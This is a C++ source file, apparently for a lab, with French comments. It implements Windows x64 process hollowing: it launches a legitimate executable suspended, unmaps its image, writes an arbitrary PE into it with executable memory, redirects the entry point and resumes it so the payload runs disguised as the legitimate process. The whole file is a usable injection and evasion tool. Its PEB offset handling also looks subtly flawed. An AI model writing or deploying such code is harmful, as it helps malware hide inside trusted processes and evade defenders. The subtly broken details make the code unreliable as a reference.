// language: C++17, file: lex_hollow.cpp, target: Windows x64 (lab)
// Process hollowing : create suspend -> unmap -> ecrire son PE -> resume
// Usage: lex_hollow.exe <processus_legitime> <mon_exe>
#include <windows.h>
#include <winternl.h>
#include <cstdio>

typedef NTSTATUS (NTAPI *pNtUnmap)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtQuery)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main(int argc, char** argv) {
    if (argc < 3) { printf("usage: %s <legitime> <mon_exe>\n", argv[0]); return 1; }

    STARTUPINFOA si{}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(argv[1], NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[X] CreateProcess\n"); return 1;
    }

    // contexte du thread suspendu -> PEB -> image base
    CONTEXT ctx{ .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    BYTE pebBuf[8];
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), pebBuf, 8, NULL);
    PVOID base;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(*(PULONG64)pebBuf + 0x10), &base, 8, NULL);

    auto unmap = (pNtUnmap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    unmap(pi.hProcess, base);

    HANDLE f = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fs = GetFileSize(f, NULL);
    BYTE* raw = new BYTE[fs];
    ReadFile(f, raw, fs, NULL, NULL);

    auto dos = (PIMAGE_DOS_HEADER)raw;
    auto nt  = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
    PVOID img = VirtualAllocEx(pi.hProcess, base, nt->OptionalHeader.SizeOfImage,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, img, raw, nt->OptionalHeader.SizeOfHeaders, NULL);

    auto sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
        WriteProcessMemory(pi.hProcess,
            (PBYTE)img + sec->VirtualAddress,
            raw + sec->PointerToRawData, sec->SizeOfRawData, NULL);

    WriteProcessMemory(pi.hProcess, (PVOID)(*(PULONG64)pebBuf + 0x10), &img, 8, NULL);
    ctx.Rcx = (DWORD64)img + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[OK] hollowing : %s prete l'apparence de %s\n", argv[2], argv[1]);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(f);
    delete[] raw;
    return 0;
}
